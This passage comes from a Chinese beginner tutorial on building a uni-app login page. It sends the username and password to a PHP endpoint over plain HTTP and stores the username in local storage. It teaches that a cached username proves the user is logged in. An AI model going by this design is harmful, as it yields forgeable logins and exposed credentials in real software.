class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/angry.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>图片加载失败<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span>HI!请登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 用户输入区域 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_box flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>用户名:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_box flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>密码:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入账号<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 登录按钮的区域 --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>navigator</span> <span class="token attr-name">url</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/pages/signup/signup<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>没有账号，立即注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>navigator</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token comment">//用户名</span><span class="token literal-property property">password</span><span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">,</span>  <span class="token comment">//密码</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">'http://10.163.72.39:5555/Login_get.php'</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span><span class="token literal-property property">password</span><span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                        <span class="token comment">// 如果登录成功</span><span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>error<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">showToast</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">,</span><span class="token literal-property property">icon</span><span class="token operator">:</span><span class="token string">'success'</span><span class="token punctuation">,</span><span class="token literal-property property">duration</span><span class="token operator">:</span><span class="token number">3000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>                        <span class="token comment">// 否者就是登录失败了</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">showToast</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">,</span><span class="token literal-property property">icon</span><span class="token operator">:</span><span class="token string">'error'</span><span class="token punctuation">,</span><span class="token literal-property property">duration</span><span class="token operator">:</span><span class="token number">3000</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">input</span><span class="token punctuation">{</span><span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token property">padding-left</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span><span class="token property">border</span><span class="token punctuation">:</span> 1px solid black<span class="token punctuation">;</span><span class="token property">margin</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.title_seciton</span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 10vh<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.image_section</span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 30vh<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> #efefef<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.input_section</span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 40vh<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button_section</span><span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> 100vw<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 20vh<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button</span><span class="token punctuation">{</span>    <span class="token property">padding</span><span class="token punctuation">:</span>10px 50px<span class="token punctuation">;</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> 25px<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> cornflowerblue<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.button:hover</span><span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子横着排 */</span><span class="token selector">.flex_row</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> row<span class="token punctuation">;</span><span class="token comment">/*排列方向：横向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span><span class="token comment">/* 弹性盒子竖着排 */</span><span class="token selector">.flex_column</span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span> <span class="token comment">/* 排列方式：弹性盒子 */</span>    <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token comment">/*排列方向：纵向*/</span>    <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*主轴居中*/</span>    <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token comment">/*副轴居中*/</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="27-记录登录信息（浏览器本地缓存）"><a href="#27-记录登录信息（浏览器本地缓存）" class="headerlink" title="27.记录登录信息（浏览器本地缓存）"></a>27.记录登录信息（浏览器本地缓存）</h2><p>登录完了之后，后端给我们返回的msg里提示登录成功，我们知道登录成功了，然后呢，就只是知道一下就行了吗？</p><p>我们要理一理登录成功会发生哪些改变，登录成功了之后我们希望网站能够知道我们的身份，我们现在为了简单，不弄什么会员等级制度，但是我们总得让网站知道我们已经登录了吧，因为网站有很多操作都是要登录才能使用的，比如发送留言等等，那怎么样才能让网站记录我们的登录状态呢，所以我们下面就会用到浏览器的缓存机制。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>存缓存<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Hello'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">setStorageSync</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span><span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token keyword">var</span> login_username <span class="token operator">=</span> uni<span class="token punctuation">.</span><span class="token function">getStorageSync</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>login_username<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存缓存也用到了uniapp给我们提供的一个接口，我们通过这个接口可以把用户的身份信息存到浏览器缓存中，但是我们之后怎么把我们的身份信息又从浏览器缓存中取出来呢？想想我们搬家的时候是怎么打包物品的呢？我们是不是要准备很多箱子，然后把我们的生活物品放到箱子里，当然如果乱放的话，到时候肯定是找不到的，所以我们会在每个箱子上贴一个标签，装衣服的箱子就贴个衣服的标签，装鞋的箱子就贴个鞋的标签。</p><p>我们存缓存也是一样的道理，如果如果把数据乱存进去，到时候肯定是找不到的，所以我们要对我们的数据贴一个标签，这个标签的名字怎么取呢？还是和我们搬家一样，放的是什么就叫什么好了，放的是衣服就贴衣服标签，我们上面的代码是要存放用户名123456，<code>uni.setStorageSync('username','123456')</code>，那标签名就叫<code>username</code>好了，之后我们再用<code>uni.getStorageSync('username')</code>去把用户名取出来，当然，我们知道，我们之前把用户名存放在<code>username</code>箱子里，我们应该从<code>username</code>这个箱子中把用户名取出来。</p><p>最后，那个123456是我们随便放的数据，只是测试一下，具体的逻辑应该是，我们先把input框中用户输入的数据放到data里，然后在通过发请求携带data中的用户名发送到后端注册，如果注册成功了，我们将username保存到缓存里，之后我们如果要判断用户是否已登录，我们就可以从缓存中取数据，如果找得到缓存的用户名数据，说明用户已经登录成功了，如果找不到肯定是没有登录成功的。</p><p>至此，我们的登录注册功能就全部完成了，这一块的内容，我就最为我们这个项目的最后考核吧，不提供代码，但是所有的知识已经教给你们了，你们只要按照这个逻辑写出来就可以了，不存在新的知识点，看你能够对所学的知识进行融会贯通吗？如果你能做到，祝贺你，你已经掌握了本部分的内容，向着更高的方向前进吧！</p><h2 id="登录页面完整代码"><a href="#登录页面完整代码" class="headerlink" title="登录页面完整代码"></a>登录页面完整代码</h2><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 标题区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title_section flex_row<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">justify-content</span><span class="token punctuation">:</span> space-around<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>X<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 图片区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../static/logo.png<span class="token punctuation">"</span></span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>HI请登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 输入区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 输入盒（包括一个文字和输入框）（弹性盒子横着排） --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_box flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span>用户名:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 输入盒（包括一个文字和输入框） --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input_box flex_row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">&gt;</span></span>密码:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- 按钮区域 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button_section flex_column<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login_button<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login()<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>登陆<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>navigator</span> <span class="token attr-name">url</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../signup/signup<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>没有账号、立即注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>navigator</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token literal-property property">password</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token literal-property property">methods</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> that <span class="token operator">=</span> <span class="token keyword">this</span>uni<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"http://10.163.72.39:5555/Login_get.php"</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">username</span><span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token punctuation">,</span><span class="token literal-property property">password</span><span class="token operator">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment">// 如果后端成功相应我们的请求</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>error<span class="token punctuation">)</span><span class="token comment">// 如果error==1的话,那就是登陆成功了</span><span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>error<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// 下面三行是新增的存储缓存的代码</span><span class="token comment">// 目的是当登陆成功的时候保存用户的用户名</span>uni<span class="token punctuation">.</span><span class="token function">setStorageSync</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span>that<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token keyword">var</span> username <span class="token operator">=</span> uni<span class="token punctuation">.</span><span class="token function">getStorageSync</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 弹框给用户看</span>uni<span class="token punctuation">.</span><span class="token function">showToast</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">icon</span><span class="token operator">:</span><span class="token string">"success"</span><span class="token punctuation">,</span><span class="token literal-property property">title</span><span class="token operator">:</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>msg<span class="token punctuation">,</span><span class="token literal-property property">duration</span><span class="token operator">:</span><span class="token number">3000</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment">// 否则就是登陆失败了</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>uni<span class="token punctuation">.</span><span class="token function">showToast</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">icon</span><span class="token operator">:</span><span class="token string">"error"</span><span class="token 